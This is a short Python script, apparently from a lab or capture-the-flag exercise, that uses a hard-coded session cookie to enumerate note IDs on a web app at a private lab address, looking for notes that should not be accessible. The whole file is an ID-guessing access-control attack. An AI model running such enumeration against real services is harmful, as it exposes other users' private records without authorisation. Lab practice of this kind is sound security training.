import requests

headers = {'Cookie':'session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ.YQPYbw.q9yMWa_6Bls8QJ3g85U1O9bK8Ws'}

for i in range(100000):
    req = requests.get(f'http://10.10.10.225:5000/notes/{i}',headers =headers)
    if req.status_code != 500:
        print(req, i)
    else:
        print('Internal err',i)

